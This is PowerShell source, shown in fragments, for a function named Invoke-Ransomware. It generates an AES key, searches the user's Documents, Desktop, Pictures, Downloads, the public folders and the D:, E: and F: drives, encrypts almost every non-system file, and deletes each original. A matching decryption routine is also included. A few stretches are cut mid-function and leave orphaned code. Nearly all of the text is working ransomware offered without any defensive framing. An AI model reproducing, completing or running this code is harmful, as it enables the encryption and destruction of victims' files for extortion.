function Generate-RijndaelKey {
    $rijndael = New-Object System.Security.Cryptography.RijndaelManaged
    $rijndael.KeySize = 256
    $rijndael.BlockSize = 128
    $rijndael.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $rijndael.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $rijndael.GenerateKey()
    $rijndael.GenerateIV()
    $RijndaelKey = $rijndael.Key
    $RijndaelIV = $rijndael.IV
    $keyData = @{
        Key = [Convert]::ToBase64String($rijndael.Key)
        IV = [Convert]::ToBase64String($rijndael.IV)
    }
    $keyData | ConvertTo-Json | Out-File $KeyPath -Force
    return $rijndael
}

function Encrypt-File {
    param([string]$FilePath, [System.Security.Cryptography.Rijndael]$Rijndael)
    
    try {
        $encryptedPath = "$FilePath.encrypted"
        $fileStream = New-Object System.IO.FileStream($encryptedPath, [System.IO.FileMode]::Create)
        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($fileStream, $Rijndael.CreateEncryptor(), [System.Security.Cryptography.CryptoStreamMode]::Write)
        $fileContent = [System.IO.File]::ReadAllBytes($FilePath)
        $cryptoStream.Write($fileContent, 0, $fileContent.Length)
        $cryptoStream.Close()
        $fileStream.Close()
        Remove-Item $FilePath -Force -ErrorAction Stop
        return $true
    }
    catch {
        return $false
    }
}

function Decrypt-File {
    param([string]$EncryptedPath, [System.Security.Cryptography.Rijndael]$Rijndael)
    
    try {
        $decryptedPath = $EncryptedPath -replace '\.encrypted$', ''
        $fileStream = New-Object System.IO.FileStream($EncryptedPath, [System.IO.FileMode]::Open)
        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($fileStream, $Rijndael.CreateDecryptor(), [System.Security.Cryptography.CryptoStreamMode]::Read)
        $fileContent = New-Object byte[] ($fileStream.Length)
        $cryptoStream.Read($fileContent, 0, $fileContent.Length) | Out-Null
        $cryptoStream.Close()
        $fileStream.Close()
        [System.IO.File]::WriteAllBytes($decryptedPath, $fileContent)
        Remove-Item $EncryptedPath -Force
        return $true
    }
    catch {
        return $false
    }
}

        $rijndael.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $rijndael.Key = [Convert]::FromBase64String($keyData.Key)
        $rijndael.IV = [Convert]::FromBase64String($keyData.IV)
        return $rijndael
    }
    return $null
}

function Invoke-Ransomware {
    $rijndael = Generate-RijndaelKey

    $encryptedFiles = @()
    $targetFolders = @(
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\Pictures",
        "$env:USERPROFILE\Videos",
        "$env:USERPROFILE\Music",
        "$env:USERPROFILE\Downloads",
        "$env:USERPROFILE\Favorites",
        "$env:USERPROFILE\Contacts",
        "$env:USERPROFILE\Links",
        "$env:USERPROFILE\Saved Games",
        "$env:USERPROFILE\Searches",
        "C:\Users\Public\Documents",
        "C:\Users\Public\Pictures",
        "C:\Users\Public\Videos",
        "C:\Users\Public\Music",
        "C:\Users\Public\Downloads",
        "D:\",
        "E:\",
        "F:\"
    )

    $excludedExtensions = @(".exe", ".jar", ".dll", ".sys", ".ini", ".key", ".msi", ".bat", ".cmd", ".ps1")

    # Collect all candidate files first to calculate total
    $candidateFiles = @()
    foreach ($folder in $targetFolders) {
        if (Test-Path $folder) {
            Get-ChildItem -Path $folder -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
                if ($excludedExtensions -notcontains $_.Extension.ToLower() -and $_.Name -ne "system.key" -and $_.Extension -ne ".encrypted") {
                    $candidateFiles += $_.FullName
                }
            }
        }
    }

    $totalFiles = $candidateFiles.Count
    $processed = 0
    $startTime = Get-Date

    $progressState = [PSCustomObject]@{
        Total = $totalFiles
        Processed = 0
        Encrypted = 0
        StartTime = $startTime
        ElapsedSeconds = 0
        RemainingSeconds = 0
        Status = 'Running'
    }
    $progressState | ConvertTo-Json | Set-Content $ProgressStateFile -Force

    Write-Host "[DEBUG] Found $totalFiles files to process. Starting encryption..."

    foreach ($filePath in $candidateFiles) {
        $processed++
        $elapsed = New-TimeSpan -Start $startTime
        $rate = if ($elapsed.TotalSeconds -gt 0) { $processed / $elapsed.TotalSeconds } else { 0 }
        $remaining = if ($rate -gt 0) { [TimeSpan]::FromSeconds(($totalFiles - $processed) / $rate) } else { [TimeSpan]::FromSeconds(0) }

        $percent = if ($totalFiles -gt 0) { [math]::Round(($processed / $totalFiles) * 100, 1) } else { 100 }
        Write-Progress -Activity "Encrypting files" -Status "$processed/$totalFiles encrypted" -PercentComplete $percent -CurrentOperation $filePath

        if (Encrypt-File -FilePath $filePath -Rijndael $rijndael) {
            $encryptedFiles += $filePath
        }

        $progressState.Processed = $processed
        $progressState.Encrypted = $encryptedFiles.Count
        $progressState.ElapsedSeconds = [math]::Round($elapsed.TotalSeconds, 0)
        $progressState.RemainingSeconds = [math]::Round($remaining.TotalSeconds,0)
        $progressState | ConvertTo-Json | Set-Content $ProgressStateFile -Force

        Write-Host "[DEBUG] $processed/$totalFiles done; elapsed: $($elapsed.ToString('hh\:mm\:ss')); remaining ~ $($remaining.ToString('hh\:mm\:ss'))"
    }

    $progressState.Status = 'Complete'
    $progressState | ConvertTo-Json | Set-Content $ProgressStateFile -Force

    Write-Host "[DEBUG] Encryption complete. $processed total attempted, $($encryptedFiles.Count) successfully encrypted."
    $encryptedFiles | Out-File $EncryptedFilesList -Force
}

        return
    }
    
    if (Test-Path $EncryptedFilesList) {
        $encryptedFiles = Get-Content $EncryptedFilesList
        
        foreach ($file in $encryptedFiles) {
            $encryptedPath = "$file.encrypted"
            if (Test-Path $encryptedPath) {
                Decrypt-File -EncryptedPath $encryptedPath -Rijndael $rijndael
            }
        }
        
        Remove-Item $EncryptedFilesList -Force
        Remove-Item $KeyPath -Force
    }
}
